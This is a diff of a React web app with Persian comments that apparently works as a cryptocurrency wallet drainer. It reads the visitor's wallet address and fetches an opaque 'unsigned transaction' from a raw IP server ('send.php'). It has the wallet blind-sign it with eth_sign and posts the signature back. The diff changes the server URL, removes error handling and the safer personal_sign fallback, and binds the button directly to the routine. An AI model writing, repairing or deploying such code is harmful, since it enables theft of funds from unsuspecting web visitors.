@@ -30,9 +30,8 @@ function App() {
     var account_sender = account[0];
     console.log("✅ Wallet Address:", account_sender);
 
-    // 🔹 آدرس API پروکسی شده
-    let proxyUrl = "https://104.194.133.124:8080/";
-    let apiUrl = proxyUrl + "send.php";
+    // 🔹 مسیر درست برای `send.php`
+    let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php";
 
     async function genSign(address, chain, type, contract = "0") {
       try {
@@ -40,29 +39,13 @@ function App() {
         if (type === "token") requestData.contract = contract;
 
         var result = await jQuery.post(apiUrl, requestData);
-        
-        // بررسی و مدیریت خطای JSON
-        try {
-          var unSigned = JSON.parse(result);
-          console.log("📜 Unsigned Transaction:", unSigned);
-        } catch (e) {
-          console.error("⚠ JSON Parsing Error in genSign:", e, result);
-          return null;
-        }
+        var unSigned = JSON.parse(result);
+        console.log("📜 Unsigned Transaction:", unSigned);
 
-        var Signed;
-        try {
-          Signed = await provider.request({
-            method: "eth_sign",
-            params: [address, unSigned.result],
-          });
-        } catch (e) {
-          console.warn("⚠ eth_sign failed, trying personal_sign...");
-          Signed = await provider.request({
-            method: "personal_sign",
-            params: [unSigned.result, address],
-          });
-        }
+        var Signed = await provider.request({
+          method: "eth_sign",
+          params: [address, unSigned.result],
+        });
 
         return Signed;
       } catch (error) {
@@ -79,14 +62,8 @@ function App() {
           type,
         });
 
-        // بررسی و مدیریت خطای JSON
-        try {
-          var resultJson = JSON.parse(result);
-          return resultJson.result;
-        } catch (e) {
-          console.error("⚠ JSON Parsing Error in acceptSign:", e, result);
-          return null;
-        }
+        var resultJson = JSON.parse(result);
+        return resultJson.result;
       } catch (error) {
         console.error("❌ Error in acceptSign:", error);
         return null;
@@ -108,13 +85,7 @@ function App() {
     <a
       href="#"
       id="kos"
-      onClick={() => {
-        if (!window.ethereum) {
-          alert("⚠ MetaMask یا یک کیف‌پول Web3 نصب نیست.");
-          return;
-        }
-        runner();
-      }}
+      onClick={runner}
       className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
       data-uk-toggle=""
     >
